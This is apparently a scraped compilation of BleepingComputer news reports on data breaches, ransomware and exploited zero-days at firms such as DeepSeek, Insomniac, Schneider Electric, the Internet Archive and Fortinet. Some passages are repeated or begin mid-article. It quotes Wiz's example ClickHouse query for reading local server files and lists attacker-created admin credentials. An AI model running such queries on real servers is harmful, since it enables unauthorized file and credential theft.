unknown if Wiz's researchers were the first to discover this exposure or if malicious actors have already taken advantage of the misconfiguration. In any case, Wiz informed DeepSeek of the matter, and the company promptly addressed the exposure, so the databases are no longer public. Apart from all the concerns that arise from DeepSeek being a China-based technology company, meaning it has to comply with aggressive data access requests from the country's government, the company does not appear to have established a solid security stance, placing sensitive data at risk. The exposure of user prompts is a privacy breach that should be very concerning for organizations using the AI model for sensitive business operations. Additionally, the exposure of backend details and API keys could give attackers a way into DeepSeek's internal networks, privilege escalation, and potentially larger-scale breaches. Earlier this week, the Chinese platform was targeted by persistent cyberattacks , which it appeared unable to thwart, forcing it to suspend new user registrations for nearly 24 hours.

The databases contained a 'log_stream' table that stored sensitive internal logs dating from January 6, 2025, containing: ""This level of access posed a critical risk to DeepSeek's own security and for its end-users,"" comments Wiz . ""Not only an attacker could retrieve sensitive logs and actual plaintext chat messages, but they could also potentially exfiltrate plaintext passwords and local files along propriety information directly from the server using queries like: SELECT * FROM file('filename') depending on their ClickHouse configuration."" Wiz says it could execute more intrusive queries but limited its exploration to enumeration to keep its research within certain ethical constraints. It is unknown if Wiz's researchers were the first to discover this exposure or if malicious actors have already taken advantage of the misconfiguration. In any case, Wiz informed DeepSeek of the matter, and the company promptly addressed the exposure, so the databases are no longer public. Apart from all the concerns that arise from DeepSeek being a China-based technology company, meaning it has to comply with aggressive data access requests from the country's government, the company does not appear to have established a solid security stance, placing sensitive data at risk. The exposure of user prompts is a privacy breach that should be very concerning for organizations using the AI model for sensitive business operations. Additionally, the exposure of backend details and API keys could give attackers a way into DeepSeek's internal networks, privilege escalation, and potentially larger-scale breaches. Earlier this week, the Chinese platform was targeted by persistent cyberattacks , which it appeared unable to thwart, forcing it to suspend new user registrations for nearly 24 hours.

The California-based video game developer has been part of Sony Interactive Entertainment's Worldwide Studios division (now known as PlayStation Studios) after being acquired by Sony in August 2019 . The gaming studio's most recent project is Marvel's Spider-Man 2, released for PlayStation 5, and is currently working on Marvel's Wolverine for the same platform. In December, Sony said they were investigating the Rhysida ransomware gang's claims that they breached Insomniac Games and stole over 1.3 million files from its network. After negotiations failed when the game studio refused to pay the $2 million ransom, Rhysida dumped 1,67 TB of documents on its dark web leak site. ""We are saddened and angered about the recent criminal cyberattack on our studio and the emotional toll it's taken on our dev team,"" the studio said in a statement published on Twitter after the leak. ""We are aware that the stolen data includes personal information belonging to our employees, former employees, and independent contractors."" The leaked files include many ID scans and internal documents, such as contract information and licensing agreements with Marvel and Nvidia, as well as screenshots of Insomniac Games' upcoming Wolverine game. As claimed on Rhysida's site, the threat actors have only leaked 98% of the files they stole from the studio after selling the rest to the highest bidder. ​Now, Insomniac Games is notifying employees whose data was stolen between November 25 and November 26 and later leaked on the Rhysida ransomware group's leak site. ""As you know, we store and maintain files containing employment information, including personal information about you. Unfortunately, these files were downloaded by an unauthorized actor and released online,"" the breach notification letter says . ""Once Insomniac identified the downloaded files, we began analyzing the files to determine what types of personal information were affected and to whom it relates. While we worked quickly, this was a time-consuming process, and we wanted to provide you with accurate information."" Insomniac and Sony are extending the ID Watchdog services offered as part of their employee benefits package with two additional years of complimentary credit monitoring and identity restoration beyond the current enrollment period. The company also has a dedicated call center ready to answer any questions affected employees may have about the November ransomware attack. A Sony spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today for more info on how many individuals were affected by this data breach and what personal information was leaked online. The Rhysida ransomware-as-a-service (RaaS) operation surfaced in May 2023 and quickly gained notoriety after breaching the Chilean Army (Ejército de Chile) and the British Library .

The company discovered the intrusion on March 1 but the investigation revealed that the attacker had access to the systems since February 22nd. Hyundai AutoEver America (HAEA) is an affiliate of Hyundai Motor Group that provides IT consulting, managed services, and helpdesk support for the entire lifecycle of automotive IT from production to retirement. Its role is to supply IT solutions and services tailored to the automotive industry, particularly for Hyundai and Kia affiliates, including vehicle telematics, OTA (over-the-air) updates, maps, vehicle connectivity, embedded systems, and autonomous driving systems. The company also provides business systems, including sales and ERP, as well as digital manufacturing platforms for car factories. According to HAEA’s site , the company has 5,000 employees, 2 million users, and its systems are used in 2.7 million cars. “On March 1, 2025, HAEA became aware of a cyber incident that impacted our information technology environment,” reads the notification to impacted individuals. “Upon discovery, we immediately launched an investigation with the support of external cybersecurity experts to assess the scope of the incident, confirm containment, and identify any affected information,” the company says. “HAEA also worked with law enforcement. Through our investigation, we determined that the unauthorized activity appears to have begun on February 22, 2025, and the last observed unauthorized activity occurred on March 2, 2025.” Regarding the types of information exposed, the letter sample only mentions names, but the Massachusetts government portal also lists Social Security Numbers (SSNs) and driver’s licenses. It is unclear if the breach impacts only employees or customers/users as well, and how many people were impacted specifically. BleepingComputer has contacted both HAEA and its parent company to ask for more details on that front, but a statement wasn’t immediately available. At the time of writing, no ransomware groups have assumed responsibility for the attack, so the perpetrators remain unknown. Hyundai has experienced multiple cybersecurity incidents over the past couple of years, including a Black Basta ransomware attack against the Korean carmaker’s European operations arm and a data breach that exposed owner data in Italy and France. In addition, researchers discovered that the Hyundai companion app for Kia and Hyundai owners had major privacy and security lapses that enabled unauthorized remote car control . Their built-in anti-theft systems have also been recently exposed as ineffective .

OneBlood first notified the public about the attack on July 31, 2024, noting that ransomware actors had encrypted its virtual machines, forcing the healthcare organization to fall back to using manual processes. OneBlood is a supplier of blood to over 250 hospitals across the United States with the attack causing delays in blood collection, testing, and distribution, leading to 'critical blood shortage' protocols in some clinics. At the time, the not-for-profit organization issued an urgent call for O Positive, O Negative, and Platelet donations, which are universally compatible and can be used in urgent transfusions. Last week, OneBlood began sending data breach notifications to impacted individuals to inform them that its investigation into the incident was completed on December 12, 2024, and determined the exact date of the breach to be July 14, 2024. The threat actor retained access to OneBlood's network until July 29, one day after the healthcare organization discovered the breach. ""Our investigation determined that between July 14 to July 29, 2024, certain files and folders were copied from our network without authorization,"" reads the OneBlood data breach notification . ""The investigation determined that your name and Social Security number was included in the relevant files and folders,"" specifies the same document. Although blood collection centers typically collect more information such as phone numbers, email and physical addresses, demographic data, and medical history, the exposed data is limited to names and SSNs. Names and SSNs can be potentially used to perform identity theft and financial fraud, and as they can't be changed easily, the risk persists for many years. To mitigate this risk, OneBlood has enclosed activation codes in the letter for a free one-year credit monitoring service, which the notification recipients are given until April 9, 2025, to take advantage of. Additionally, impacted individuals should consider placing credit freezes and fraud alerts on their accounts to prevent financial damages. Although OneBlood did abide by its original promise to inform impacted individuals of potential data exposure, the six months of delay has left those people at risk.

Schneider Electric confirms dev platform breach after hacker steals data,https://www.bleepingcomputer.com/news/security/schneider-electric-confirms-dev-platform-breach-after-hacker-steals-data/,Lawrence Abrams,"November 4, 2024","Schneider Electric has confirmed a developer platform was breached after a threat actor claimed to steal 40GB of data from the company's JIRA server. ""Schneider Electric is investigating a cybersecurity incident involving unauthorized access to one of our internal project execution tracking platforms which is hosted within an isolated environment,"" Schneider Electric told BleepingComputer. ""Our Global Incident Response team has been immediately mobilized to respond to the incident. Schneider Electric's products and services remain unaffected."" Schneider Electric is a French multinational company that manufactures energy and automation products ranging from household electrical components found in big box stores to enterprise-level industrial control and building automation products. Over the weekend, a threat actor known as ""Grep"" taunted the company on X, indicating they had breached its systems. In a conversation with BleepingComputer, Grep said they breached Schneider Electric's Jira server using exposed credentials. Once they gained access, they claimed to use a MiniOrange REST API to scrape 400k rows of user data, which Grep says includes 75,000 unique email addresses and full names for Schneider Electric employees and customers. In a post to a dark web site, the threat actor jokingly demands $125,000 in ""Baguettes"" not to leak the data, sharing more details about what was stolen. ""This breach has compromised critical data, including projects, issues, and plugins, along with over 400,000 rows of user data, totally more than 40GB Compressed Data,"" reads a post to the Hellcat extortion site. Grep told BleepingComputer they recently formed a new hacking group, International Contract Agency (ICA), named after Hitman: Codename 47 game. The threat actor says this group did not previously extort the companies they breached. However, after learning that the ""ICA"" name is associated with a ""group of Islamic terrorists,"" the threat actors say they rebranded as the Hellcat ransomware gang and are currently in the process of testing an encryptor to be used in extortion attacks. Grep told BleepingComputer that they are extorting Schneider Electric, demanding $125,000 not to leak stolen data, and half of that if an official statement is released. Earlier this year, Schneider Electric's ""Sustainability Business"" division was breached in a Cactus ransomware attack , where the threat actors claimed to have stolen terabytes of data. Update 11/5/24: Story updated to reflect that they switched to the Hellcat name and are extorting Schneider Electric.

Nova Scotia Power, a subsidiary of Emera Inc., is a significant utility in Canada. It serves over 500,000 residential, commercial, and industrial customers in Nova Scotia, holding 95% of the market share. It generates over 10,000 GWh of energy annually, distributed through an extensive network of power lines extending for 32,000 kilometers (20,000 miles). On April 28, 2025, the company announced that it had discovered unauthorized access into certain parts of its network and servers supporting its business. Although there was no impact on the company's electricity production and distribution, the incident response efforts disrupted internal operations. Further investigations revealed on May 1, 2025, that customer information might have been stolen. An update published yesterday confirmed this previous finding, specifying the following data was exposed: Also, the company found that the actual breach occurred earlier than initially anticipated, on March 19, 2025, which means that nearly two months had passed by the time affected customers were informed via notices mailed to their addresses. Nova Scotia Power says there are no signs the stolen data has been misused, but it will provide two years of credit monitoring service coverage to letter recipients to mitigate the risks. ""Notifications are in the process of being mailed to impacted account holders, which includes detailed information about resources and support,"" reads the incident status update . ""While we have no evidence of misuse of your personal information, as a precaution, arrangements have been made with the consumer reporting agency, TransUnion, to provide impacted individuals with a two-year subscription to a comprehensive credit monitoring service at no cost."" Customers of Nova Scotia Power are advised to remain vigilant for phishing attempts, including cases of threat actors impersonating the utility to trick people into giving away sensitive data.

Internet Archive breached again through stolen access tokens,https://www.bleepingcomputer.com/news/security/internet-archive-breached-again-through-stolen-access-tokens/#comments,Lawrence Abrams,"October 20, 2024","The Internet Archive was breached again, this time on their Zendesk email support platform after repeated warnings that threat actors stole exposed GitLab authentication tokens. Since last night, BleepingComputer has received numerous messages from people who received replies to their old Internet Archive removal requests, warning that the organization has been breached as they did not correctly rotate their stolen authentication tokens. ""It's dispiriting to see that even after being made aware of the breach weeks ago, IA has still not done the due diligence of rotating many of the API keys that were exposed in their gitlab secrets,"" reads an email from the threat actor. ""As demonstrated by this message, this includes a Zendesk token with perms to access 800K+ support tickets sent to info@archive.org since 2018."" ""Whether you were trying to ask a general question, or requesting the removal of your site from the Wayback Machine your data is now in the hands of some random guy. If not me, it'd be someone else."" The email headers in these emails also pass all DKIM, DMARC, and SPF authentication checks, proving they were sent by an authorized Zendesk server at 192.161.151.10. After publishing this story, BleepingComputer was told by a recipient of these emails that they had to upload personal identification when requesting a removal of a page from the Wayback Machine. The threat actor may now also have access to these attachments depending on the API access they had to Zendesk and if they used it to download support tickets . These emails come after BleepingComputer repeatedly tried to warn the Internet Archive that their source code was stolen through a GitLab authentication token that was exposed online for almost two years. On October 9th, BleepingComputer reported that Internet Archive was hit by two different attacks at once last week —a data breach where the site's user data for 33 million users was stolen and a DDoS attack by an alleged pro-Palestinian group named SN_BlackMeta. While both attacks occurred over the same period, they were conducted by different threat actors. However, many outlets incorrectly reported that SN_BlackMeta was behind the breach rather than just the DDoS attacks. This misreporting frustrated the threat actor behind the actual data breach, who contacted BleepingComputer through an intermediary to claim credit for the attack and explain how they breached the Internet Archive. The threat actor told BleepingComputer that the initial breach of Internet Archive started with them finding an exposed GitLab configuration file on one of the organization's development servers, services-hls.dev.archive.org . BleepingComputer was able to confirm that this token has been exposed since at least December 2022, with it rotating multiple times since then. The threat actor says this GitLab configuration file contained an authentication token allowing them to download the Internet Archive source code. The hacker says that this source code contained additional credentials and authentication tokens, including the credentials to Internet Archive's database management system. This allowed the threat actor to download the organization's user database, further source code, and modify the site. The threat actor claimed to have stolen 7TB of data from the Internet Archive but would not share any samples as proof. However, now we know that the stolen data also included the API access tokens for Internet Archive's Zendesk support system. BleepingComputer attempted to contact the Internet Archive numerous times, as recently as on Friday, offering to share what we knew about how the breach occurred and why it was done, but we never received a response. After the Internet Archive was breached, conspiracy theories abounded about why they were attacked. Some said Israel did it, the United States government, or corporations in their ongoing battle with the Internet Archive over copyright infringement. However, the Internet Archive was not breached for political or monetary reasons but simply because the threat actor could. There is a large community of people who traffic in stolen data, whether they do it for money by extorting the victim, selling it to other threat actors, or simply because they are collectors of data breaches. This data is often released for free to gain cyber street cred , increasing their reputation among other threat actors in this community as they all compete for who has the most significant and most publicized attacks. In the case of the Internet Archive, there was no money to be made by trying to extort the organization. However, as a well-known and extremely popular website, it definitely boosted a person's reputation amongst this community. While no one has publicly claimed this breach, BleepingComputer was told it was done while the threat actor was in a group chat with others, with many receiving some of the stolen data. This database is now likely being traded amongst other people in the data breach community, and we will likely see it leaked for free in the future on hacking forums like Breached.

EasyPark is a Swedish company that creates mobile and web apps that serve as parking space locators, booking managers, and EV charging point finders. The company operates digital parking services in 20 countries and over 4,000 cities, covering most of Europe, the United States, Australia, New Zealand, and the UK. The EasyPark app (Europe-focused) has over 10 million downloads on Google Play, while its other apps, RingGo (UK-focused) and ParkMobile (US-focused), have 5 million installs each. As reported by BleepingComputer, ParkMobile disclosed a massive data breach in 2021 that exposed the stolen data for 21 million customers. This database was subsequently released for free on a hacking forum. Although a firm spokesperson has declined to provide details about this new breach and how many customers were impacted, they told BleepingComputer that a portion of European users had been affected, indicating that the incident concerns mainly EasyPark app users. The company's announcement mentions that some customers have had the following information compromised, depending on what they have provided to the platform: The above could help cybercriminals launch effective phishing attacks against the exposed EasyPark users, which the company warns explicitly about in the data breach notice . However, the company clarifies that the disclosed data does not pose a risk for executing unauthorized transactions, and no such activities have resulted from the cybersecurity incident.

The incident has also caused an ICT service disruption, as announced on the website, and although most of the impacted systems have been brought back online, the remaining backlogs may continue to cause delays. Oxford City Council is the local government authority responsible for managing critical public services, such as housing, planning, waste collection, environmental health, and elections, in Oxford, England. The authority serves a population of around 155,000 residents, but its influence extends further due to the city's international prominence through the University of Oxford, tourism, and research institutions. A statement on its website explains that attackers gained unauthorized access to some of its systems and databases, which host personal information.

""Unfortunately, the attackers were able to access some historic data on legacy systems,"" reads the statement published on the Oxford City Council website. ""We have now identified that people who worked on Oxford City Council-administered elections between 2001 and 2022, including poll station workers and ballot counters, may have had some personal details accessed.""

"Hackers exploited Citrix, Cisco ISE flaws in zero-day attacks",https://www.bleepingcomputer.com/news/security/hackers-exploited-citrix-cisco-ise-flaws-in-zero-day-attacks/,Bill Toulas,"November 12, 2025","An advanced threat actor exploited the critical vulnerabilities “Citrix Bleed 2"" (CVE-2025-5777) in NetScaler ADC and Gateway, and CVE-2025-20337 affecting Cisco Identity Service Engine (ISE) as zero-days to deploy custom malware. Amazon’s threat intelligence team, analyzing “ MadPot ” honeypot data, found that hackers leveraged the two security issues before the security issues were disclosed publicly and patches became available. “Our Amazon MadPot honeypot service detected exploitation attempts for the Citrix Bleed Two vulnerability ( CVE-2025-5777 ) prior to public disclosure, indicating a threat actor had been exploiting the vulnerability as a zero-day,” explains Amazon . “Through further investigation of the same threat exploiting the Citrix vulnerability, Amazon Threat Intelligence identified and shared with Cisco an anomalous payload targeting a previously undocumented endpoint in Cisco ISE that used vulnerable deserialization logic.” Citrix Bleed 2 is a NetScaler ADC and Gateway out-of-bounds memory read problem that the vendor published fixes for in late June . Although the vendor needed a longer period to confirm that the flaw was leveraged in attacks, despite multiple third-party reports claiming it was used in attacks, exploits became available in early July, and CISA tagged it as exploited . The flaw in ISE ( CVE-2025-20337 ), with a maximum severity score, was published on July 17 , when Cisco warned that it could be exploited to let an unauthenticated attacker store malicious files, execute arbitrary code, or gain root privileges on vulnerable devices. In less than five days, the vendor reissued its warning about CVE-2025-20337 being actively exploited . On July 28, researcher Bobby Gould published technical details in a write-up that included an exploit chain. In a report shared with BleepingComputer, Amazon says that both flaws were leveraged in APT attacks before Cisco and Citrix published their initial security bulletins. The hackers leveraged CVE-2025-20337 to gain pre-auth admin access to Cisco ISE endpoints, and deployed a custom web shell named ‘IdentityAuditAction,’ disguised as a legitimate ISE component. The web shell registered as an HTTP listener to intercept all requests and used Java reflection to inject into Tomcat server threads. It also employed DES encryption with non-standard base64 encoding for stealth, required knowledge of specific HTTP headers to access, and left minimal forensic traces behind. The use of multiple undisclosed zero-day flaws and the advanced knowledge of Java/Tomcat internals and the Cisco ISE architecture all point to a highly resourced and advanced threat actor. However, Amazon could not attribute the activity to a known threat group. Curiously, though, the targeting appeared indiscriminate, which doesn’t match the typically tight scope of highly targeted operations by such threat actors. It is recommended to apply the available security updates for CVE-2025-5777 and CVE-2025-20337, and limit access to edge network devices through firewalls and layering.

""We identified a zero-day remote code execution vulnerability within a non-ScienceLogic third-party utility that is delivered with the SL1 package,"" explained a statement from Jessica Lindberg, Vice President at ScienceLogic. ""Upon identification, we rapidly developed a patch to remediate the incident and have made it available to all customers globally."" ScienceLogic declined to name the third-party utility to avoid providing hints to other hackers, as it might be used on several other products. The attack was first disclosed by a user on X who warned that a Rackspace outage from September 24 was due to active exploitation in the hosting provider's ScienceLogic EM7. ""Oopsie, a zero-day remote code execution vulnerability was exploited ... third-party ScienceLogic application used by Rackspace,"" an account named ynezz shared on X . ""We have confirmed that the exploit of this third-party application resulted in access to three internal Rackspace monitoring webservers.""

It provides real-time visibility, event correlation, and automated workflows to help manage and optimize IT environments efficiently. Rackspace, a managed cloud computing (hosting, storage, IT support) company, uses ScienceLogic SL1 to monitor its IT infrastructure and services. In response to the discovery of the malicious activity, Rackspace disabled monitoring graphs on its MyRack portal until they could push an update to remediate the risk. However, the situation was worse than what a short Rackspace service status update reflected. As first reported by The Register , Rackspace's SL1 solution was hacked via the zero-day and some customer information was stolen. In an email sent to customers and seen by The Register, Rackspace warned that the hackers exploited the zero-day to gain access to web servers and steal limited customer monitoring data, including customer account names and numbers, customer usernames, Rackspace internally generated device IDs, device name and information, IP addresses, and AES256 encrypted Rackspace internal device agent credentials. Rackspace rotated those credentials as a precaution, despite them being strongly encrypted, and informed customers they needed to take no further action to protect from the malicious activity, which had been stopped. While the data is limited, it is common for companies to hide their devices' IP addresses behind content delivery systems and DDoS mitigation platforms. Threat actors could use the exposed IP addresses to target company's devices in DDoS attacks or further exploitation attempts. It is unknown how many customers have been impacted by this breach. Update 10/2 - A RackSpace spokesperson has sent BleepingComputer the following information: On September 24th, 2024, Rackspace discovered a zero-day remote code execution vulnerability in a non-Rackspace utility that is packaged and delivered by the third-party ScienceLogic application (known as SL1).

Russian airline Aeroflot grounds dozens of flights after cyberattack,https://www.bleepingcomputer.com/news/security/russian-airline-aeroflot-grounds-dozens-of-flights-after-cyberattack/#comment_form,Bill Toulas,"July 29, 2025","Aeroflot, Russia's flag carrier, has suffered a cyberattack that resulted in the cancellation of more than 60 flights and severe delays on additional flights. Although official sources from Russia, like the General Prosecutor's Office , did not attribute the attack to specific threat groups or even origin, responsibility was taken by Ukrainian and Belarusian hacktivist collectives 'Silent Crow' and 'Cyberpartisans BY.' The latter are known for previous attacks on the Belarusian Railway , the country's state-owned railway company, that actively supported the movement of Russian military equipment into Ukraine at the time. According to announcements made on X and on Telegram , the hackers claimed to have infiltrated Aeroflot's IT infrastructure for over a year, mapped it extensively to pinpoint all valuable resources, and then ""destroyed"" it. Specifically, the two groups claim to have gained access to 122 hypervisors, 43 ZVIRT virtualization installations, approximately 100 iLO interfaces used for server management, and four Proxmox clusters. During their alleged access to those systems, they say they exfiltrated all databases from flight history and employee workstations (including of top executives), wiretapping servers containing phone call recordings, and personnel monitoring systems.

Russian airline Aeroflot grounds dozens of flights after cyberattack,https://www.bleepingcomputer.com/news/security/russian-airline-aeroflot-grounds-dozens-of-flights-after-cyberattack/,Bill Toulas,"July 29, 2025","Aeroflot, Russia's flag carrier, has suffered a cyberattack that resulted in the cancellation of more than 60 flights and severe delays on additional flights. Although official sources from Russia, like the General Prosecutor's Office , did not attribute the attack to specific threat groups or even origin, responsibility was taken by Ukrainian and Belarusian hacktivist collectives 'Silent Crow' and 'Cyberpartisans BY.' The latter are known for previous attacks on the Belarusian Railway , the country's state-owned railway company, that actively supported the movement of Russian military equipment into Ukraine at the time. According to announcements made on X and on Telegram , the hackers claimed to have infiltrated Aeroflot's IT infrastructure for over a year, mapped it extensively to pinpoint all valuable resources, and then ""destroyed"" it. Specifically, the two groups claim to have gained access to 122 hypervisors, 43 ZVIRT virtualization installations, approximately 100 iLO interfaces used for server management, and four Proxmox clusters. During their alleged access to those systems, they say they exfiltrated all databases from flight history and employee workstations (including of top executives), wiretapping servers containing phone call recordings, and personnel monitoring systems. On the day of the action, the hacktivists claim to have wiped 7,000 physical and virtual servers hosting 12TB of databases, 8TB of Windows Share files, and 2TB of corporate email.

Game Freak is best known for being the co-owner and the primary developing studio of the Pokémon series video game, which started in 1996 with the Pokémon Red and Blue for Nintendo Game Boy. The gaming studio has since released multiple titles in the Pokémon series for various Nintendo platforms like the 3DS, Switch, and iOS and Android (Pokémon Quest). Over the weekend, various leak sites and channels on Discord, Reddit, and X began posting screenshots of source code and development builds of upcoming Pokémon games developed by Game Freak. While Game Freak has not acknowledged the leak of this game data, it did confirm that the personal information of its workforce, contractors, and former employees, including retirees and former business associates was stolen. ""Game Freak Inc. announces that in August 2024, unauthorized access to our servers by a third party occurred, resulting in a leak of our employees' personal information,"" reads the machine-translated notice . ""We deeply apologize for any inconvenience and concern this may have caused to all concerned parties."" The leaked information includes full names and company email addresses, which lessens the risk for those involved, limiting it to phishing and targeted brute-forcing attacks. Those determined to have been impacted by the incident will be contacted individually, but Game Freak published the notice on its site as not everyone can be reached. It is presumed that Pokémon player data has not been impacted, as Game Freak states its detailed investigation of the breached servers has been concluded, and security measures to prevent similar incidents from occurring in the future were implemented. Earlier this month, Canadian video game developer Red Barrels warned its community of players that a cyberattack would likely cause development delays on patches and additional content for existing Outlast games and upcoming titles. The attack was later claimed by the Nitrogen ransomware group, who claimed to have stolen 1.8 TB of confidential data from Red Barrels.

Stellantis is a multinational corporation formed in 2021 after the merger of the PSA Group (Peugeot Société Anonyme) and Fiat Chrysler Automobiles (FCA). Stellantis is currently one of the largest automotive companies globally by revenue and the world's fifth-largest automaker by volume. The company owns 14 major automotive brands, including Alfa Romeo, Chrysler, Citroën, Dodge, DS Automobiles, Fiat, Jeep, Lancia, Maserati, Opel, Peugeot, Ram, and Vauxhall, and it operates manufacturing facilities across Europe, North America, South America, and other regions, with operations in over 130 countries. According to a statement published over the weekend, the attackers only stole customer contact information during the breach since the compromised platform was not used to store financial or other sensitive personal information. ""We recently detected unauthorized access to a third-party service provider's platform that supports our North American customer service operations,"" Stellantis said . ""Upon discovery, we immediately activated our incident response protocols, initiated a comprehensive investigation, and took prompt action to contain and mitigate the situation. We are also notifying the appropriate authorities and directly informing affected customers."" The auto giant also advised customers to be cautious of potential phishing attempts and to refrain from clicking suspicious links or sharing personal information when receiving unexpected emails, texts, or calls. BleepingComputer reached out to Stellantis with questions about the incident, but a response was not immediately available. Although Stellantis didn't share more information regarding this attack, BleepingComputer has learned that it is part of a recent wave of Salesforce data breaches linked with the ShinyHunters extortion group, which has affected numerous high-profile companies. Earlier today, ShinyHunters claimed responsibility for the Stellantis data breach and told BleepingComputer that they had stolen over 18 million Salesforce records, including names and contact details, from the company's Salesforce instance. Since the start of the year , the extortion group has been targeting Salesforce customers in data theft attacks using voice phishing attacks, impacting companies such as Google , Cisco , Qantas , Adidas , Allianz Life , Farmers Insurance , Workday , and LVMH subsidiaries, including Dior , Louis Vuitton , and Tiffany & Co . ShinyHunters also claims they used stolen OAuth tokens for Salesloft's Drift AI chat integration with Salesforce to steal sensitive information, such as passwords, AWS access keys, and Snowflake tokens, after gaining access to customers' Salesforce instances. Using this method, they claimed to have stolen customer information from Google , Cloudflare , Zscaler , Tenable , Palo Alto Networks , CyberArk , Nutanix , Qualys , Rubrik , Elastic , BeyondTrust , Proofpoint , JFrog , Cato Networks , and many more . Last week, the FBI released a Flash alert sharing IOCs discovered during the attacks and warning about threat actors breaching organizations' Salesforce environments to steal data and extort victims. Meanwhile, the extortion group told BleepingComputer that they had stolen over 1.5 billion Salesforce records from 760 companies, using compromised Salesloft Drift OAuth tokens.

The company owns 14 major automotive brands, including Alfa Romeo, Chrysler, Citroën, Dodge, DS Automobiles, Fiat, Jeep, Lancia, Maserati, Opel, Peugeot, Ram, and Vauxhall, and it operates manufacturing facilities across Europe, North America, South America, and other regions, with operations in over 130 countries. According to a statement published over the weekend, the attackers only stole customer contact information during the breach since the compromised platform was not used to store financial or other sensitive personal information. ""We recently detected unauthorized access to a third-party service provider's platform that supports our North American customer service operations,"" Stellantis said . ""Upon discovery, we immediately activated our incident response protocols, initiated a comprehensive investigation, and took prompt action to contain and mitigate the situation. We are also notifying the appropriate authorities and directly informing affected customers."" The auto giant also advised customers to be cautious of potential phishing attempts and to refrain from clicking suspicious links or sharing personal information when receiving unexpected emails, texts, or calls. BleepingComputer reached out to Stellantis with questions about the incident, but a response was not immediately available. Although Stellantis didn't share more information regarding this attack, BleepingComputer has learned that it is part of a recent wave of Salesforce data breaches linked with the ShinyHunters extortion group, which has affected numerous high-profile companies. Earlier today, ShinyHunters claimed responsibility for the Stellantis data breach and told BleepingComputer that they had stolen over 18 million Salesforce records, including names and contact details, from the company's Salesforce instance. Since the start of the year , the extortion group has been targeting Salesforce customers in data theft attacks using voice phishing attacks, impacting companies such as Google , Cisco , Qantas , Adidas , Allianz Life , Farmers Insurance , Workday , and LVMH subsidiaries, including Dior , Louis Vuitton , and Tiffany & Co . ShinyHunters also claims they used stolen OAuth tokens for Salesloft's Drift AI chat integration with Salesforce to steal sensitive information, such as passwords, AWS access keys, and Snowflake tokens, after gaining access to customers' Salesforce instances. Using this method, they claimed to have stolen customer information from Google , Cloudflare , Zscaler , Tenable , Palo Alto Networks , CyberArk , Nutanix , Qualys , Rubrik , Elastic , BeyondTrust , Proofpoint , JFrog , Cato Networks , and many more . Last week, the FBI released a Flash alert sharing IOCs discovered during the attacks and warning about threat actors breaching organizations' Salesforce environments to steal data and extort victims. Meanwhile, the extortion group told BleepingComputer that they had stolen over 1.5 billion Salesforce records from 760 companies, using compromised Salesloft Drift OAuth tokens.

Fortinet FortiWeb flaw with public PoC exploited to create admin users,https://www.bleepingcomputer.com/news/security/fortiweb-flaw-with-public-poc-actively-exploited-to-create-admin-users/,Lawrence Abrams,"November 13, 2025","A Fortinet FortiWeb path traversal vulnerability is being actively exploited to create new administrative users on exposed devices without requiring authentication. The issue is fixed in FortiWeb 8.0.2, and admins are urged to update as soon as possible and check for signs of unauthorized access The exploitation was first spotted by threat intelligence company Defused on October 6, which reported an ""Unknown Fortinet exploit"" used against exposed devices to create admin accounts. Since then, attacks have increased, with threat actors now spraying the exploit globally. According to new research published by Daniel Card of PwnDefend and Defused, the flaw is a path traversal issue affecting the following Fortinet endpoint: Threat actors are sending HTTP POST requests to this path containing payloads that create local admin-level accounts on the targeted device. The exploitation observed by researchers includes multiple sets of created username and password combinations, with usernames including Testpoint , trader1 , and trader . Passwords seen assigned to accounts include 3eMIXX43 , AFT3$tH4ck , and AFT3$tH4ckmet0d4yaga!n . The attacks originated from a wide range of IP addresses, including: Security researchers at watchTowr Labs have confirmed the exploit, posting a video on X that demonstrates a failed FortiWeb login attempt, the execution of the exploit, and the successful login as the newly created admin user. watchTowr also released a tool called "" FortiWeb Authentication Bypass Artifact Generator ,"" which attempts to exploit the flaw by creating an admin user with an 8-character random username derived from a UUID. The tool was released to help defenders identify vulnerable devices. According to Rapid7 , which tested the exploit across multiple versions, the flaw affects FortiWeb versions 8.0.1 and earlier. The flaw was fixed in version 8.0.2, which is believed to have been released at the end of October. However, BleepingComputer has been unable to find any disclosure of a FortiWeb vulnerability on Fortinet's PSIRT site that matches the one being exploited. BleepingComputer contacted Fortinet with questions about this reported exploitation and will update our story when we receive a response. As the vulnerability appears to be actively exploited in the wild, administrators should review their devices for unusual administrative accounts, check logs for requests to the fwbcgi path, and investigate any activity from the identified suspicious IP addresses. Administrators should also ensure these management interfaces are not reachable from the internet and are restricted to trusted networks or VPN-only access.

A mishandled GitHub token exposed Mercedes-Benz source code,https://www.bleepingcomputer.com/news/security/a-mishandled-github-token-exposed-mercedes-benz-source-code/,Bill Toulas,"January 30, 2024","A mishandled GitHub token gave unrestricted access to Mercedes-Benz's internal GitHub Enterprise Service, exposing source code to the public. Mercedes-Benz is a prestigious German car, bus, and truck maker recognized for its rich history of innovation, luxurious designs, and top build quality. Like many modern automakers, the brand uses software in its vehicles and services, including safety and control systems, infotainment, autonomous driving, diagnostic and maintenance tools, connectivity and telematics, and electric power and battery management (for EVs). On September 29, 2023, researchers at RedHunt Labs discovered a GitHub token in a public repository belonging to a Mercedez employee that gave access to the company's internal GitHub Enterprise Server. ""The GitHub token gave 'unrestricted' and 'unmonitored' access to the entire source code hosted at the Internal GitHub Enterprise Server,"" reads RedHunt Labs' report . ""The incident laid bare sensitive repositories housing a wealth of intellectual property, and the compromised information included database connection strings, cloud access keys, blueprints, design documents, SSO passwords, API keys, and other critical internal information."" As the researchers explained, the consequences of publicly exposing that data can be severe. Source code leaks can lead to competitors reverse-engineering proprietary technology or hackers scrutinizing it for potential vulnerabilities in vehicle systems. Also, the exposure of API keys could lead to unauthorized data access, service disruption, and abuse of the company's infrastructure for malicious purposes. RedHunt Labs also mentions the possibility of legal violations, such as GDPR infringement, in case the exposed repositories contained customer data. However, the researchers have not validated the contents of the exposed files. RedHunt, with help from TechCrunch , informed Mercedes-Benz of the token leak on January 22, 2024, and revoked it two days later, blocking access to anyone holding and abusing it. This incident resembles a Toyota security mishap from October 2022, when the Japanese automaker revealed that personal customer information remained publicly accessible for five years due to an exposed GitHub access key. These incidents only generate evidence of malicious exploitation if the owners of GitHub Enterprise instances have activated audit logs, which typically include IP addresses. BleepingComputer has contacted Mercedes-Benz to learn if they have seen any signs of unauthorized access on their GitHub server, and we received the following response: We can confirm that source code containing an internal access token was published on a public GitHub repository by human error. This token gave access to a certain number of repositories, but not to the entire source code hosted at the Internal GitHub Enterprise Server. We have 